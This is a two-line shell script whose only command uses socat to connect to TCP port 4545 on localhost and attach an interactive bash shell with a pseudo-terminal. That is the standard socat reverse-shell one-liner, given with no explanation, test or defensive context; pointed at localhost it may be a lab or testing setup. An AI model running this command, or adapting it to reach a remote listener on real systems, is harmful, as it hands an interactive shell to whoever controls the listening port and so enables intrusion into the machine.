#!/bin/sh

socat tcp:127.0.0.1:4545 exec:"bash -i",pty,stderr,setsid,sigint,sane
